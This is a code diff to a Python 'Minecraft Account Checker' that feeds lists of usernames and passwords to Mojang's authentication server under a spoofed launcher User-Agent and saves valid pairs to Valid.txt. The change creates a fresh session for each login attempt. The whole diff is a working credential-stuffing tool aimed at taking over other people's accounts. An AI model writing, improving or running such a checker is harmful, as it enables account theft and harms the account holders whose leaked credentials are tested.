@@ -4,8 +4,6 @@ import ctypes, time, os
 
 class Minecraft:
     def __init__(self):
-        self.session = requests.Session()
-        self.session.trust_env = False
         self.checking = True
         self.usernames = []
         self.passwords = []
@@ -28,8 +26,9 @@ class Minecraft:
         ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid))))
 
     def check_account(self, username, password):
+        session = requests.Session()
         json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
-        check = self.session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"})
+        check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"})
         if "clientToken" in check.text:
             with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
             self.valid += 1
